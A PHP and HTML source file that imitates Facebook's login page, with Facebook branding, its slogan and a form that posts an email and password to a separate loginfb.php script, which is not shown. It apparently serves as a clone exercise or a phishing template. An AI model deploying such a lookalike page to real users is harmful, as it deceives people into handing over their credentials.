<?php

if(isset($_GET['status']) && $_GET['status'] == "false"){
 echo "<script> alert('Username and Password is incorrect') </script>";
}
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Login or sign up</title>
    <link rel="stylesheet" href="Facebook.css">
    <link rel="icon" href="https://static.vecteezy.com/system/resources/previews/012/660/856/non_2x/facebook-logo-on-transparent-isolated-background-free-vector.jpg">
</head>

<body class="body">
<div class="div1">
    <h1 class="colorfont">facebook</h1>
    <p class="colorfont2">Connect with friends and the world <br> around you on facebook</p>
    </div>
<div class="div2">
    <form action="loginfb.php" method="POST">
    <input id="email" class="type1" type="text" name="email" placeholder="Email or phone number"><br><br>
    <input id="password" class="type2" type="password" name="password" placeholder="Password"><br><br>
    <button class="click" type="submit">Log in</button>
    <p class="type3">Forgot password?</p>
    <div class="underline"></div>
    <a href="createaccount.php">
    <button type="button" class="click2"> Create a new account</button>
    </a>
    </form>
</div>
       <p class="page"> <span class="page1" style="font-weight: bold;">  Create a Page </span> for a celebrity, brand or business.</p>
  
      
</body>
 <script src="Facebook.js"></script>
</html>